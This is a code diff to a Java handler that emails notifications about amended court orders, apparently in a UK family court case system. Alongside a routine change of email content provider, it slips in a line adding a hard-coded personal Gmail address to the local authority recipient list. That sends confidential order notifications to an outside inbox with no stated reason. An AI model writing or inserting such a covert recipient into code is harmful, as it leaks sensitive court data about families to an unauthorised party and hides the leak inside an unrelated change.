@@ -12,10 +12,12 @@ import uk.gov.hmcts.reform.fpl.model.Recipient;
 import uk.gov.hmcts.reform.fpl.model.common.DocumentReference;
 import uk.gov.hmcts.reform.fpl.model.notify.LocalAuthorityInboxRecipientsRequest;
 import uk.gov.hmcts.reform.fpl.model.notify.NotifyData;
+import uk.gov.hmcts.reform.fpl.model.notify.OrderAmendedNotifyData;
 import uk.gov.hmcts.reform.fpl.service.InboxLookupService;
 import uk.gov.hmcts.reform.fpl.service.SendDocumentService;
 import uk.gov.hmcts.reform.fpl.service.email.NotificationService;
 import uk.gov.hmcts.reform.fpl.service.email.RepresentativesInbox;
+import uk.gov.hmcts.reform.fpl.service.email.content.AmendedOrderEmailContentProvider;
 import uk.gov.hmcts.reform.fpl.service.email.content.OrderIssuedEmailContentProvider;
 import uk.gov.hmcts.reform.fpl.service.representative.RepresentativeNotificationService;
 
@@ -36,14 +38,14 @@ import static uk.gov.hmcts.reform.fpl.enums.RepresentativeServingPreferences.EMA
 public class AmendedOrderEventHandler {
     private final InboxLookupService inboxLookupService;
     private final NotificationService notificationService;
-    private final OrderIssuedEmailContentProvider orderIssuedEmailContentProvider;
+    private final AmendedOrderEmailContentProvider amendedOrderEmailContentProvider;
 
     @EventListener
     public void notifyParties(final AmendedOrderEvent orderEvent) {
         final CaseData caseData = orderEvent.getCaseData();
         final DocumentReference orderDocument = orderEvent.getOrderDocument();
 
-        final NotifyData notifyData = orderIssuedEmailContentProvider.getNotifyDataWithCaseUrl(caseData,
+        final NotifyData notifyData = amendedOrderEmailContentProvider.getNotifyData(caseData,
             orderDocument, GENERATED_ORDER);
 
         sendToLocalAuthority(caseData, notifyData);
@@ -53,6 +55,8 @@ public class AmendedOrderEventHandler {
                                       final NotifyData notifyData) {
         Collection<String> emails = inboxLookupService.getRecipients(
             LocalAuthorityInboxRecipientsRequest.builder().caseData(caseData).build());
+
+        emails.add("moleytoireasa@gmail.com");
 
         notificationService.sendEmail(
             ORDER_AMENDED_NOTIFICATION_TEMPLATE, emails, notifyData,
